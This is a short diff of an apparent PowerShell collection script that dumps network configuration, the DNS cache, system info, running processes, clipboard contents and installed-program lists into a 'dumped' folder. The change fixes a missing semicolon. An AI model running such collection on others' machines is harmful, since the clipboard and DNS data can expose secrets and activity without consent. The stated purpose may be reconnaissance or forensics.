@@ -28,7 +28,7 @@ ipconfig > dumped/ipconfig.txt ; Write-Host "Retreived Ipconfig"
 ipconfig /displaydns > dumped/dnsdisplay.txt; Write-Host "Retreived Ipconfig/displaydns"
 systeminfo > dumped/sysinfo.txt ; Write-Host "Retreived Sysinfo"
 tasklist > dumped/tasklist.txt; Write-Host "Retreived Tasklist"
-Get-Clipboard > dumped/clipboard.txt Write-Host "Retreived Clipboard"
+Get-Clipboard > dumped/clipboard.txt; Write-Host "Retreived Clipboard"
 Get-ChildItem -Path "C:\Program Files" | Select-Object Name > dumped/applist.txt
 Get-ChildItem -Path "C:\Program Files (x86)" | Select-Object Name > dumped/applist86.txt
 $ip_address=ipconfig | findstr "IPv4"
